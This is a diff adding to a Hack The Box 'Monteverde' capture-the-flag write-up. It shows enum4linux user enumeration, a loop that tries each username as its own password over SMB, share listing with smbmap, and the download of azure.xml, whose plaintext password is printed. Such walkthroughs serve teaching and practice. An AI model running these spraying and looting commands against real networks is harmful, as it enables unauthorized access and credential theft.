@@ -19,7 +19,7 @@ Discovered open port 464/tcp on 10.10.10.172
 Discovered open port 88/tcp on 10.10.10.172
 Discovered open port 3268/tcp on 10.10.10.172
 Discovered open port 389/tcp on 10.10.10.172
-Discovered open port 593/tcp on 10.10.10.172                                                                                                       
+Discovered open port 593/tcp on 10.10.10.172                                                                                   
 Discovered open port 636/tcp on 10.10.10.172 
 ```
 We do an `-sC` and `-sV` on the ports and see the following:
@@ -283,9 +283,9 @@ Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 enum4linux complete on Tue Mar 10 10:59:08 2020
 ```
 
-Awesome - so we find a few usernames. Let's store the `enum4linux` results in a file called `enum4linux.txt` and collect the usernames with this command:
+Awesome - so we find a few usernames. Let's store the `enum4linux` results in a file called `enum.txt` and collect the usernames with this command:
 ```
-kali@kali:~/htb/boxes/monteverde/enum4linux$ cat enum4linux.txt | grep member | grep MEGABANK | cut -d'\' -f2
+kali@kali:~/htb/boxes/monteverde/enum4linux$ cat enum.txt | grep member | grep MEGABANK | cut -d'\' -f2 > users.txt
 ```
 ```
 Guest
@@ -308,4 +308,134 @@ mhope
 roleary
 Administrator
 ```
-At this point, we can first <TBC>
+At this point, we have usernames, but no passwords. We could use these usernames and try to brute-force for passwords, but before we do that, let's try and see if some of the users adopted _lazy_ security practices such as [_using their usernames as passwords_](https://wiki.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)#Testing_for_default_credentials_of_common_applications).
+  
+  
+To do this, we can do a loop that passes the username in both the `username` and `password` field when authenticating via `smbclient`:
+```
+for i in $(cat users.txt);do echo "[+] $i" && smbclient -L monteverde.htb -U $i%$i;done
+```
+```
+[+] Guest
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] dgalanos
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] smorgan
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] Administrator
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] krbtgt
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] AAD_987d7f2f57d2
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] mhope
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] SABatchJobs
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        azure_uploads   Disk      
+        C$              Disk      Default share
+        E$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        users$          Disk      
+SMB1 disabled -- no workgroup available
+[+] svc-ata
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] svc-bexec
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] svc-netapp
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] dgalanos
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] roleary
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] smorgan
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] Administrator
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] AAD_987d7f2f57d2
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] mhope
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] roleary
+session setup failed: NT_STATUS_LOGON_FAILURE
+[+] Administrator
+session setup failed: NT_STATUS_LOGON_FAILURE
+```
+Looks like we got one lazy user! `SABatchJobs` logs in with `SABatchJobs`. Let's take a closer look with `smbmap`:
+```
+kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs'
+[+] IP: monteverde.htb:445      Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        azure_uploads                                           READ ONLY
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        users$                                                  READ ONLY
+```
+We've got a few readable shares in `azure_uploads` and `users$`. Let's do a recursive search on both with the `-R` option on `smbmap`:
+```
+kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs' -R"azure_uploads"
+[+] IP: monteverde.htb:445      Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        azure_uploads                                           READ ONLY
+        .\azure_uploads\*
+        dr--r--r--                0 Fri Jan  3 04:43:36 2020    .
+        dr--r--r--                0 Fri Jan  3 04:43:36 2020    ..
+```
+```
+kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs' -R"users$"
+[+] IP: monteverde.htb:445      Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        users$                                                  READ ONLY
+        .\users$\*
+        dr--r--r--                0 Fri Jan  3 05:12:48 2020    .
+        dr--r--r--                0 Fri Jan  3 05:12:48 2020    ..
+        dr--r--r--                0 Fri Jan  3 05:15:23 2020    dgalanos
+        dr--r--r--                0 Fri Jan  3 05:41:18 2020    mhope
+        dr--r--r--                0 Fri Jan  3 05:14:56 2020    roleary
+        dr--r--r--                0 Fri Jan  3 05:14:28 2020    smorgan
+        .\users$\mhope\*
+        dr--r--r--                0 Fri Jan  3 05:41:18 2020    .
+        dr--r--r--                0 Fri Jan  3 05:41:18 2020    ..
+        fw--w--w--             1212 Fri Jan  3 06:59:24 2020    azure.xml
+```
+Looks like we have only one readable file in `azure.xml` in the `users$` share in the `mhope` folder. Let's get that file and take a look - we can do this fast with a single `smbget` command:
+```
+kali@kali:~/htb/boxes/monteverde/enum4linux$ smbget smb://monteverde.htb/users$/mhope/azure.xml -U SABatchJobs%SABatchJobs
+Using workgroup WORKGROUP, user SABatchJobs
+smb://monteverde.htb/users$/mhope/azure.xml                                                                                                        
+Downloaded 1.18kB in 5 seconds
+```
+```
+kali@kali:~/htb/boxes/monteverde/enum4linux$ cat azure.xml 
+��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
+    <Props>
+      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
+      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
+      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
+      <S N="Password">4n0therD4y@n0th3r$</S>
+    </Props>
+  </Obj>
+</Objs>
+```
+All right! Looks like we got `mhope`'s credentials. That wasn't so hard was it???
+
+###Shell as mhope
+
